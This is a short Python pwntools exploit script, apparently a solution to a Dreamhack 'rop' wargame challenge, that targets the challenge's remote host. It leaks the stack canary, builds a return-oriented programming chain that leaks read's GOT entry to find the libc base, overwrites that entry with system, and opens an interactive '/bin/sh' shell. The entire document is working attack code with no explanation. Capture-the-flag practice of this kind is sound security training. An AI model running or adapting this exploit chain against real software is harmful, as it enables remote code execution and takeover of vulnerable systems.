from pwn import *

#p = process('./rop')
p = remote('host3.dreamhack.games', 8905)
e = ELF('./rop')
libc = ELF('./libc.so.6')
read_got = e.got['read']
read_plt = e.plt['read']
write_plt = e.plt['write']
pop_rdi = 0x400853
pop_rsi_r15 = 0x400851
ret = 0x400854

payload = b'A' * 0x39
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))

payload = b'A' * 0x38 + p64(canary) + b'B' * 0x8
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

payload += p64(pop_rdi) + p64(read_got + 0x8)
payload += p64(ret) + p64(read_plt)

p.sendafter(b'Buf: ', payload)

read = u64(p.recvn(6) + b'\x00' * 2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()